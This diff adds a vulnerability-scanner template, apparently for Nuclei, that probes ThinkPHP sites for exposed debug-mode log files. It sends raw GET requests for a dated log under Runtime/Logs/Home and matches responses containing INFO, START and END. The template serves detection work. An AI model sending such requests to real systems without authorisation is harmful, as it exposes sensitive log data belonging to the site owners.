@@ -1,0 +1,36 @@
+id: thinkphp-debug-log-disclosure
+
+info:
+  name: ThinkPHP Debug Mode Log Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    ThinkPHP Debug mode has a log information disclosure vulnerability. When Debug is turned on, logs will be generated in the Runtime directory. Attackers can read sensitive log information by constructing a special URL address.
+  reference:
+    - http://www.thinkphp.cn/
+  tags: information-disclosure
+
+http:
+  - raw:
+      - |
+        GET /thinkphp3/Application/Runtime/Logs/Home/21_11_02.log HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+      - |
+        GET /thinkphp3/Runtime/Logs/Home/21_11_02.log HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "INFO"
+          - "START"
+          - "END"
+        condition: and
